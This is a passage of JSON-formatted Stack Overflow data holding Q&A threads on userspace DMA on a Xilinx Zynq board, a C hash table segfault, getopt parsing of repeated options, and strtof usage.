"https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 1, "creation_date": 1449704894, "post_id": 34190686, "comment_id": 56128783, "body": "@AndyShevchenko the UIO framework is not used for initializing DMA, but rather as simple way to expose memory to user space.  Each UIO device can make one or more memory regions available for memory mapping. Each mapping has its own directory in sysfs .... as I don&#39;t <i>know</i> Zync I don&#39;t know how to access the DMA part, but wrapping that in a UIO module makes it easier for the user space to <i>access</i> it."}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1449705412, "post_id": 34190686, "comment_id": 56128980, "body": "Yes, but someone somehow still need to run the hardware, I think UIO helps a little in this case. Most of the stuff will be inside kernel part of the driver anyway. I&#39;m even not sure that some part of image / video filtering makes sense in user space (e.g. the images came from camera through V4L2 interface), I wonder if it would be possible to extend UIO framework  to support DMA Engine API."}, {"owner": {"reputation": 20275, "user_id": 887836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UmvnY.jpg?s=128&g=1", "display_name": "Alexander Oh", "link": "https://stackoverflow.com/users/887836/alexander-oh"}, "reply_to_user": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1449735691, "post_id": 34190686, "comment_id": 56139194, "body": "@AndyShevchenko it really depends on the hardware I think. while exposing the DMA configuration is definitely possible this is only half of the work. if you driver needs interrupts working or does require some high performance logic you need to expose that as well. creating a DSL based driver framework is definitely possible (e.g. usb gadget fs does userspace drivers where you configure the driver via file descriptors, <a href=\"http://www.linux-usb.org/gadget/\" rel=\"nofollow noreferrer\">linux-usb.org/gadget</a>)"}, {"owner": {"reputation": 3561, "user_id": 2511795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30c869f55cbcf82a7bc4536d563daa0a?s=128&d=identicon&r=PG", "display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1449745192, "post_id": 34190686, "comment_id": 56145100, "body": "I believe the configfs example is a bad one here. In any case the topic starter must elaborate what they are doing and why in that way."}], "tags": [], "owner": {"reputation": 20275, "user_id": 887836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UmvnY.jpg?s=128&g=1", "display_name": "Alexander Oh", "link": "https://stackoverflow.com/users/887836/alexander-oh"}, "is_accepted": false, "score": 1, "last_activity_date": 1575962712, "last_edit_date": 1575962712, "creation_date": 1449702192, "answer_id": 34190686, "question_id": 34188369, "link": "https://stackoverflow.com/questions/34188369/easiest-way-to-use-dma-in-linux/34190686#34190686", "title": "Easiest way to use DMA in Linux", "body": "<p>One potential option could be to use the <a href=\"https://www.kernel.org/doc/html/latest/driver-api/uio-howto.html\" rel=\"nofollow noreferrer\">UIO interface</a> (See also this <a href=\"http://www.embedded.com/design/operating-systems/4401769/Device-drivers-in-user-space\" rel=\"nofollow noreferrer\">blog article</a>)</p>\n\n<p>There is some example code in the link, but the general structure of the code is:</p>\n\n<ul>\n<li>you have a little kernel module that handles the IO init and exposes the DMA. (See <a href=\"https://www.kernel.org/doc/htmldocs/uio-howto/custom_kernel_module.html\" rel=\"nofollow noreferrer\">documentation</a>)</li>\n<li>your userspace program then handles all the IO that you need in order to get it working. (See also <a href=\"https://www.kernel.org/doc/htmldocs/uio-howto/uio_pci_generic_example.html\" rel=\"nofollow noreferrer\">example code</a>)</li>\n</ul>\n\n<p>Since you didn't specify what you want to do I cannot be more specific.\nBut you need to figure how to initialize your memory in kernel (See the tag wiki for docs on that <a href=\"https://lwn.net/Kernel/LDD3/\" rel=\"nofollow noreferrer\">LDD3</a> is great).</p>\n"}, {"tags": [], "owner": {"reputation": 23464, "user_id": 877235, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/my8FB.jpg?s=128&g=1", "display_name": "stdcall", "link": "https://stackoverflow.com/users/877235/stdcall"}, "is_accepted": false, "score": 0, "last_activity_date": 1449782391, "creation_date": 1449782391, "answer_id": 34211939, "question_id": 34188369, "link": "https://stackoverflow.com/questions/34188369/easiest-way-to-use-dma-in-linux/34211939#34211939", "title": "Easiest way to use DMA in Linux", "body": "<p>There's surely a <code>dmaengine</code> driver for that specific platform.\nAll you need to do is to create a small kernel module that gives the user space access to dmaengine client's API.</p>\n\n<p>Please read:\n<a href=\"http://lxr.free-electrons.com/source/Documentation/dmaengine/client.txt\" rel=\"nofollow\">dmaengine client</a></p>\n"}, {"tags": [], "owner": {"reputation": 2238, "user_id": 230925, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/57Neo.jpg?s=128&g=1", "display_name": "Jamey Hicks", "link": "https://stackoverflow.com/users/230925/jamey-hicks"}, "is_accepted": false, "score": 0, "last_activity_date": 1452195533, "creation_date": 1452195533, "answer_id": 34663727, "question_id": 34188369, "link": "https://stackoverflow.com/questions/34188369/easiest-way-to-use-dma-in-linux/34663727#34663727", "title": "Easiest way to use DMA in Linux", "body": "<p>I was surprised when I got a Zedboard a few years ago that I needed to write a device driver in order to connect my application to the programmable logic.</p>\n\n<p>So I started work on the <a href=\"http://www.connectal.org/\" rel=\"nofollow\">Connectal Framework</a> to solve that problem. Connectal provides a generic device driver for Zynq FPGAs and for Xilinx or Altera FPGAs attached via PCI Express. The device driver enables user-mode software to memory-map the control interface of the hardware and to share memory (via DMA) with the hardware. It also provides an MMU for the programmable logic, so that applications and programmable logic can use the same linear offsets into shared memory objects.</p>\n\n<p>Connectal uses Bluespec Systems Verilog for its hardware libraries, which might make the framework or its device drivers difficult to use in your application, but it is available and we would be happy to explain and document in more detail the hardware interface.</p>\n\n<p>Connectal is available on github:</p>\n\n<ul>\n<li><a href=\"http://github.com/cambridgehackers/connectal\" rel=\"nofollow\">http://github.com/cambridgehackers/connectal</a></li>\n</ul>\n\n<p>The relevant drivers are here:</p>\n\n<ul>\n<li><a href=\"http://github.com/cambridgehackers/connectal/tree/master/drivers/zynqportal\" rel=\"nofollow\">http://github.com/cambridgehackers/connectal/tree/master/drivers/zynqportal</a></li>\n<li><a href=\"http://github.com/cambridgehackers/connectal/tree/master/drivers/portalmem\" rel=\"nofollow\">http://github.com/cambridgehackers/connectal/tree/master/drivers/portalmem</a></li>\n</ul>\n\n<p>There are a couple of alternatives out there:</p>\n\n<ul>\n<li>zynq-xdma: <a href=\"https://github.com/bmartini/zynq-xdma/blob/master/dev/xdma.c\" rel=\"nofollow\">https://github.com/bmartini/zynq-xdma/blob/master/dev/xdma.c</a></li>\n<li>Xillybus: <a href=\"http://xillybus.com/\" rel=\"nofollow\">http://xillybus.com/</a> (requires a license)</li>\n</ul>\n"}], "owner": {"reputation": 381, "user_id": 1194635, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d95521a602116a40e908ff84d91694d?s=128&d=identicon&r=PG", "display_name": "Filippo Savi", "link": "https://stackoverflow.com/users/1194635/filippo-savi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6333, "favorite_count": 2, "answer_count": 3, "score": 10, "last_activity_date": 1575962712, "creation_date": 1449692963, "last_edit_date": 1449746856, "question_id": 34188369, "link": "https://stackoverflow.com/questions/34188369/easiest-way-to-use-dma-in-linux", "title": "Easiest way to use DMA in Linux", "body": "<p>I'm a EE and for a project at uni I'm developing hardware assisted image/video filtering on an FPGA (Xilinx ZYNQ), said device also has a dual core ARM A9 processor inside and more importantly there is also an ARM Primecell PL330 DMA controller</p>\n\n<p>I'm using Yocto to build a basic linux environement that I can use on the processor with Xilinx's custom kernel kernel branch.</p>\n\n<p>Now if I'understood correctly I'can't use the kernel DMA API directly, but I would have to write a custom kernel driver, and here lies the problem, since I don't have enough kernel knowledge to be able to do that (and in particular to set up a build environement for the custom module)...</p>\n\n<p>so is there some kind of library/API/anything really that can make DMA transfers from userland? (in  particular it would be from memory to a memory mapped peripheral (An AXI4 port between PS and PL on the zynq)</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>After some late night experimenting, I got a basic hello world kernel module to load correctly, so I think i'll go the right way and write a small device-driverish shim that takes a chunk of data from user space (part of an image in this case) and pass it to the FPGA part if the IC trough DMA api </p>\n\n<p>I'll report my successes or failures ;)</p>\n"}, {"tags": ["c++", "c", "hash"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1449692887, "post_id": 34188281, "comment_id": 56123032, "body": "Have you run your program in a debugger to help you find the problem yourself? At the minimum it will tell you the line of code which causes the seg fault. If you really need help then please post a <a href=\"http://stackoverflow.com/help/mcve\">Minimal Complete and Verifiable Example</a>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1449693058, "post_id": 34188281, "comment_id": 56123130, "body": "With <code>char hkey[3]; sprintf(hkey, &quot;%d&quot;, n);</code> will <code>n</code> always be a 2-digit number? The <code>struct</code> field allows for an 8-digit number, you have <code>strcpy(new-&gt;ckey, hkey);</code> Should <code>hkey</code> be <code>ktype hkey</code> to match the <code>struct</code> field?"}, {"owner": {"reputation": 285, "user_id": 1536010, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/f56535dbaa6cec5a3bc7df07b08c84be?s=128&d=identicon&r=PG", "display_name": "skills", "link": "https://stackoverflow.com/users/1536010/skills"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1449693182, "post_id": 34188281, "comment_id": 56123189, "body": "@kaylum Thank you for the tip, i will post a minimal complete and verifiable example in the next 5 min."}, {"owner": {"reputation": 285, "user_id": 1536010, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/f56535dbaa6cec5a3bc7df07b08c84be?s=128&d=identicon&r=PG", "display_name": "skills", "link": "https://stackoverflow.com/users/1536010/skills"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449693277, "post_id": 34188281, "comment_id": 56123249, "body": "@WeatherVane hkey corresponds to hashed key, in fact the size of the table is only 31 (academical purposes only, not real world implementation), so that string hkey[3] is enough."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449693697, "post_id": 34188281, "comment_id": 56123489, "body": "Looing at the code link, don&#39;t you <code>#include</code> any library headers?"}, {"owner": {"reputation": 285, "user_id": 1536010, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/f56535dbaa6cec5a3bc7df07b08c84be?s=128&d=identicon&r=PG", "display_name": "skills", "link": "https://stackoverflow.com/users/1536010/skills"}, "edited": false, "score": 0, "creation_date": 1449693796, "post_id": 34188281, "comment_id": 56123537, "body": "I&#39;m really sorry, i&#39;m such a fool. Added now."}, {"owner": {"reputation": 41213, "user_id": 215568, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b05685e6c3945f4bd23bf1f967861aeb?s=128&d=identicon&r=PG", "display_name": "Donnie", "link": "https://stackoverflow.com/users/215568/donnie"}, "edited": false, "score": 0, "creation_date": 1449695074, "post_id": 34188281, "comment_id": 56124195, "body": "Use <code>new</code>, not <code>malloc</code> in C++ code.  It&#39;s less error-prone.  watch out for your pointer indirections."}], "answers": [{"tags": [], "owner": {"reputation": 2237, "user_id": 1219722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9f308a0947ea106f91b5ba413cd9c04c?s=128&d=identicon&r=PG", "display_name": "Dmitry Rubanovich", "link": "https://stackoverflow.com/users/1219722/dmitry-rubanovich"}, "is_accepted": false, "score": 0, "last_activity_date": 1449694790, "creation_date": 1449694790, "answer_id": 34188869, "question_id": 34188281, "link": "https://stackoverflow.com/questions/34188281/hash-tables-closed-addressing-how-to-initialize-and-print/34188869#34188869", "title": "hash tables (Closed addressing). How to initialize and print?", "body": "<p>I think you want to both assign (in initialize) and then check (in print) the value of <code>h[i]</code> rather than <code>*h[i]</code>.</p>\n\n<p>As a side, your insert seems spotty, too.  If nothing else, almost all of C compilers are C++ compilers and <code>new</code> is a C++ keyword.  So it's a bad idea to name your C  variables by that name.</p>\n"}, {"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 1, "last_activity_date": 1449694944, "creation_date": 1449694944, "answer_id": 34188915, "question_id": 34188281, "link": "https://stackoverflow.com/questions/34188281/hash-tables-closed-addressing-how-to-initialize-and-print/34188915#34188915", "title": "hash tables (Closed addressing). How to initialize and print?", "body": "<p>You have your pointers all wrong for function args and implementation. <code>Chashtable</code> is an array of <code>struct</code> pointers. I removed one level of indirection everywhere and the code now runs, perhaps not as you would like! BTW I had to patch in a <code>hash()</code> function. I hope you can take this on from here.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define HASHSIZE 31\n#define EMPTY   \" \"\n#define DELETED \"-\"\n\ntypedef char ktype[9];\ntypedef void *Infoc;\n\ntypedef struct entryc{\n    ktype ckey;\n    Infoc infoc;\n    struct entryc *next;\n} Entryc;\n\ntypedef Entryc *Chashtable[HASHSIZE];\n\nint hash(ktype k, int z) {\n   return rand() % HASHSIZE;\n}\n\nvoid initChain(Chashtable h){\n    int i;\n    for(i=0; i&lt;HASHSIZE; i++){\n        h[i] = NULL;\n    }\n}\n\nvoid printChain(Chashtable h){\n    int i;\n    for(i=0; i&lt;HASHSIZE; i++){\n        if((h[i])){\n        printf(\"-&gt; %s\\n\", (h[i])-&gt;ckey);\n        }\n    }\n}\n\nvoid insertChain(Chashtable h, ktype k, Infoc inf){\n    int n= hash(k, 0);\n    char hkey[3];\n    sprintf(hkey, \"%d\", n);\n    struct entryc *new = malloc (sizeof(struct entryc));\n    strcpy(new-&gt;ckey, hkey);\n    new-&gt;infoc = inf;\n    new-&gt;next = h[n];\n    h[n] = new;\n}\n\nint main(void) {\n    // system (\"tput clear\");\n\n    Chashtable j;\n    initChain(j);\n    printChain(j);\n    insertChain(j, \"myname\", \"single\");\n    printChain(j);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 285, "user_id": 1536010, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/f56535dbaa6cec5a3bc7df07b08c84be?s=128&d=identicon&r=PG", "display_name": "skills", "link": "https://stackoverflow.com/users/1536010/skills"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 417, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1449694944, "creation_date": 1449692609, "last_edit_date": 1449693770, "question_id": 34188281, "link": "https://stackoverflow.com/questions/34188281/hash-tables-closed-addressing-how-to-initialize-and-print", "title": "hash tables (Closed addressing). How to initialize and print?", "body": "<p>How should i deal with a hash table for closed addressing?</p>\n\n<p>Data structure:</p>\n\n<pre><code>typedef char ktype[9];\ntypedef void *Infoc;\n\ntypedef struct entryc{\n    ktype ckey;\n    Infoc infoc;\n    struct entryc *next;\n} Entryc;\n\ntypedef Entryc *Chashtable[HASHSIZE];\n</code></pre>\n\n<p>I am declaring a pointer of an array of structs, initialized:</p>\n\n<pre><code>void initChain(Chashtable *h){\n    int i;\n    for(i=0; i&lt;HASHSIZE; i++){\n        *h[i] = NULL;\n    }\n}\n</code></pre>\n\n<p>This is the insertion code:</p>\n\n<pre><code>void insertChain(Chashtable *h, ktype k, Infoc inf){\n    int n= hash(k, 0);\n    char hkey[3];\n    sprintf(hkey, \"%d\", n);\n    struct entryc *new = malloc (sizeof(struct entryc));\n    strcpy(new-&gt;ckey, hkey);\n    new-&gt;infoc = inf;\n    new-&gt;next = *h[n];\n    *h[n] = new;\n}\n</code></pre>\n\n<p>And i would like to print out the hash table:</p>\n\n<pre><code>void printChain(Chashtable *h){\n    int i;\n    for(i=0; i&lt;HASHSIZE; i++){\n        if((*h[i])){\n        printf(\"-&gt; %s\\n\", (*h[i])-&gt;ckey);\n        }\n    }\n}\n</code></pre>\n\n<p>I get a segmentation fault while printing, why?</p>\n\n<p>Thank you.</p>\n\n<p>EDIT:</p>\n\n<p>Complete code with segmentation fault (No other errors in the debugger found):</p>\n\n<p>**</p>\n\n<blockquote>\n  <p>Full compilable code here:</p>\n</blockquote>\n\n<p>**\n<a href=\"http://pastebin.com/GHpfqmP3\" rel=\"nofollow\">http://pastebin.com/GHpfqmP3</a></p>\n"}, {"tags": ["c", "parsing", "getopt", "getopt-long"], "answers": [{"comments": [{"owner": {"reputation": 111, "user_id": 3593232, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21144afe6c36e37e331afd87c977cf6a?s=128&d=identicon&r=PG&f=1", "display_name": "user3593232", "link": "https://stackoverflow.com/users/3593232/user3593232"}, "edited": false, "score": 0, "creation_date": 1449725887, "post_id": 34188752, "comment_id": 56134832, "body": "Thank you but actually the difficulty is in getting all sizes before writing into the optionnal/default file, so it&#39;s about storing the optarg of each -s."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "reply_to_user": {"reputation": 111, "user_id": 3593232, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21144afe6c36e37e331afd87c977cf6a?s=128&d=identicon&r=PG&f=1", "display_name": "user3593232", "link": "https://stackoverflow.com/users/3593232/user3593232"}, "edited": false, "score": 0, "creation_date": 1449725942, "post_id": 34188752, "comment_id": 56134850, "body": "@user3593232 I&#39;m not getting you. The above code will allow you to parse all the sizes. The file write code would go after that. Of course the above code is just a sample and only prints out the sizes. Your real code would save the parsed sizes into an array, list or some other structure. That is, replace the above <code>printf(&quot;size=%d\\n&quot;, atoi(optarg));</code> line with code that stores that same <code>optarg</code> value."}, {"owner": {"reputation": 111, "user_id": 3593232, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21144afe6c36e37e331afd87c977cf6a?s=128&d=identicon&r=PG&f=1", "display_name": "user3593232", "link": "https://stackoverflow.com/users/3593232/user3593232"}, "edited": false, "score": 0, "creation_date": 1449732695, "post_id": 34188752, "comment_id": 56137709, "body": "&quot;problem&quot; is that I don&#39;t know the size of the array. But it&#39;s not a real problem since I can majorate it with argc...  I admit it&#39;s not a good question. What disturbed me at first was the fact that I will declare an array which won&#39;t be fulfilled. In my case it&#39;s not a big deal, but in case there are lot of possible different repeated options it could be a big lost to declare an array of argc for each one.  I may be a little parano&#239;d !"}], "tags": [], "owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "is_accepted": false, "score": 3, "last_activity_date": 1449694401, "creation_date": 1449694401, "answer_id": 34188752, "question_id": 34188126, "link": "https://stackoverflow.com/questions/34188126/getopt-with-repeated-and-optional-arguments/34188752#34188752", "title": "getopt with repeated and optional arguments", "body": "<p><code>getopt</code> can handle both repeated and optional args just fine. For repeated args each invocation of <code>getopt</code> will give you the next arg. <code>getopt</code> doesn't care that it is repeated. For the arg at the end, just need to check for its presence once all the options are parsed. Below is code modified from the example in the <code>getopt</code> man page to handle your scenario:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nint\nmain(int argc, char *argv[])\n{\n    int opt;\n\n    while ((opt = getopt(argc, argv, \"s:\")) != -1) {\n        switch (opt) {\n        case 's':\n            printf(\"size=%d\\n\", atoi(optarg));\n            break;\n        default: /* '?' */\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    if (optind &lt; argc) {\n        printf(\"name=%s\\n\", argv[optind]);\n    } else {\n        printf(\"optional name arg not present\\n\");\n    }\n\n    exit(EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>And here is some sample runs of the program showing it handling repeated options and the arg at the end.</p>\n\n<pre><code>$ ./a.out -s 10 -s 20 -s 30\nsize=10\nsize=20\nsize=30\noptional name arg not present\n\n$ ./a.out -s 1 my_name\nsize=1\nname=my_name\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 0, "last_activity_date": 1449730620, "creation_date": 1449730620, "answer_id": 34195566, "question_id": 34188126, "link": "https://stackoverflow.com/questions/34188126/getopt-with-repeated-and-optional-arguments/34195566#34195566", "title": "getopt with repeated and optional arguments", "body": "<p>I think you're overthinking this. I know it's always tempting to try to avoid malloc's, but the efficiency of option parsing is never (*) important. You only parse options once, and in the cost of initializing a new process, finding the executable, linking and loading it, and all the rest of the process of starting up a command, the time it takes to parse options is probably not even noise.</p>\n\n<p>So just do it in the simplest way possible. Here's one possible outline:</p>\n\n<pre><code>int main(int argc, char* argv) {\n  /* These variables describe the options */\n  int  nparts = 0;              // Number of partitions\n  unsigned long* parts = NULL;  // Array of partitions (of size nparts)\n  const char* diskname=\"/the/default/name\"; // Disk's filename\n\n  for (;;) {\n    switch (getopt(argc, argv, \"s:\")) {\n      case '?':\n        /* Print usage message */\n        exit(1);\n      case 's':\n        /* Some error checking missing */\n        parts = realloc(parts, ++nparts * sizeof *parts);\n        parts[nparts - 1] = strtoul(optarg, NULL, 0);\n        continue;\n      case -1:\n        break;\n    }\n    break;\n  }\n  if (optind &lt; argc) diskname = argv[optind++];\n  if (optind != argc) {\n    /* print error message */ \n    exit(1);\n  }\n  return do_partitions(diskname, parts, nparts);\n}\n</code></pre>\n\n<p>The above code is missing a lot of error checking and other niceties, but it's short and to the point. It simply reallocs the partition array every time a new size is found. (That's probably not as awful as you think it is, because realloc itself is probably clever enough to increase the allocation size exponentially. But even if it were awful, it's not going to happen often enough to even notice.)</p>\n\n<p>The trick with <code>continue</code> and <code>break</code> is a common way of nesting a switch inside a for. In the switch, <code>continue</code> will continue the for loop, while <code>break</code> will break out of the switch; since all the switch actions which do not terminate the for loop <code>continue</code>, whatever follows the switch block is only executed for a switch action which explicitly <code>break</code>s. So the <code>break</code> following the <code>switch</code> block breaks the for loop in precisely those cases where the switch action did a <code>break</code>.</p>\n\n<p>You might want to check that there was at least one partition size defined before call the function which does the repartitioning.</p>\n"}], "owner": {"reputation": 111, "user_id": 3593232, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21144afe6c36e37e331afd87c977cf6a?s=128&d=identicon&r=PG&f=1", "display_name": "user3593232", "link": "https://stackoverflow.com/users/3593232/user3593232"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2318, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1449730620, "creation_date": 1449691958, "question_id": 34188126, "link": "https://stackoverflow.com/questions/34188126/getopt-with-repeated-and-optional-arguments", "title": "getopt with repeated and optional arguments", "body": "<p>For a simple C project of a filesystem in a file, I have to make a command for writing the partitions table. It just contains the number of partitions and the size of them, pretty simple.</p>\n\n<p>It should work like <code>mk_part -s size [-s size ...] [name]</code>.</p>\n\n<p><code>[name]</code> is the filename of the disk, it's optionnal because there is a default one provided.</p>\n\n<p>I don't know much getopt_long (and getopt) but all I read is that I while get options in a while so the two way of processing for me would be :</p>\n\n<ol>\n<li>store all the sizes in an array and then write them in the table.</li>\n<li>write size directly during parsing</li>\n</ol>\n\n<p>For the first choice the difficulty is that I don't know the number of partitions. But I still could majorate this number by argc or better by (argc-1)/2 and it would work.</p>\n\n<p>For the second choice I don't know which file to write.</p>\n\n<p>So what is the best alternative to get all those arguments and how can I get this optionnal name ? </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 14254, "user_id": 1663383, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/3aaf8438a71124d393af5af486a7e78b?s=128&d=identicon&r=PG", "display_name": "Draco18s no longer trusts SE", "link": "https://stackoverflow.com/users/1663383/draco18s-no-longer-trusts-se"}, "edited": false, "score": 0, "creation_date": 1449691876, "post_id": 34188066, "comment_id": 56122433, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/3191034/convert-string-to-float-in-objective-c\">Convert string to float in Objective-C</a>"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 5, "creation_date": 1449691890, "post_id": 34188066, "comment_id": 56122445, "body": "Did you disable warnings or what? The prototype for <code>strtof()</code> looks rather different than what you seem to think."}], "answers": [{"comments": [{"owner": {"reputation": 47, "user_id": 484693, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/3d288f7bd453f70f5fa5f0dd4036240e?s=128&d=identicon&r=PG", "display_name": "mrentropy", "link": "https://stackoverflow.com/users/484693/mrentropy"}, "edited": false, "score": 0, "creation_date": 1449693347, "post_id": 34188159, "comment_id": 56123280, "body": "OK thanks. I hadn&#39;t disabled warnings, and I didn&#39;t get one, but that was clearly the problem. Including stdlib.h, and adding a second argument &quot;NULL&quot; to strtof(), together fixed it. However, I think the usage  of strcpy() was actually correct; argv[1] is already a pointer."}, {"owner": {"reputation": 47, "user_id": 484693, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/3d288f7bd453f70f5fa5f0dd4036240e?s=128&d=identicon&r=PG", "display_name": "mrentropy", "link": "https://stackoverflow.com/users/484693/mrentropy"}, "edited": false, "score": 1, "creation_date": 1449694067, "post_id": 34188159, "comment_id": 56123668, "body": "Ooops, you meant the usage of strtof(), not strcpy(). Yes, you are right, my usage of strtof() was incorrect (sigh)."}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 4, "last_activity_date": 1449692098, "creation_date": 1449692098, "answer_id": 34188159, "question_id": 34188066, "link": "https://stackoverflow.com/questions/34188066/convert-a-number-in-a-string-to-float-in-c-atof-strtof-do-not-work/34188159#34188159", "title": "convert a number in a string to float in c: atof(), strtof() do not work", "body": "<p>You haven't included <code>&lt;stdlib.h&gt;</code> to get <a href=\"http://man7.org/linux/man-pages/man3/strtod.3.html\" rel=\"nofollow\"><code>strtof()</code></a>'s prototype. So the return type defaults to int. But implicit int rule has been removed from C since C99.</p>\n\n<p>The usage is also wrong. It should be, at least:</p>\n\n<pre><code>char *eptr;\n\nx = strtof(a, &amp;eptr);\n</code></pre>\n\n<p>And inspect <code>eptr</code> for conversion failures.</p>\n\n<p>Compile with warnings enabled. GCC warns with:</p>\n\n<blockquote>\n  <p>warning: implicit declaration of function \u2018strtof\u2019\n  [-Wimplicit-function-declaration]</p>\n</blockquote>\n"}], "owner": {"reputation": 47, "user_id": 484693, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/3d288f7bd453f70f5fa5f0dd4036240e?s=128&d=identicon&r=PG", "display_name": "mrentropy", "link": "https://stackoverflow.com/users/484693/mrentropy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2120, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1449694989, "creation_date": 1449691753, "last_edit_date": 1495542655, "question_id": 34188066, "link": "https://stackoverflow.com/questions/34188066/convert-a-number-in-a-string-to-float-in-c-atof-strtof-do-not-work", "title": "convert a number in a string to float in c: atof(), strtof() do not work", "body": "<p>My C is rusty. I am trying to convert a string to float (or double). I have tried atof() and strtof(), and tried following instructions <a href=\"https://stackoverflow.com/questions/7951019/convert-string-to-float\">here</a> and <a href=\"https://stackoverflow.com/questions/25756939/gnu-c-atof-strtof-and-strtod-fail-debian-for-beagleboard\">here</a>. No luck.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char *argv[]) 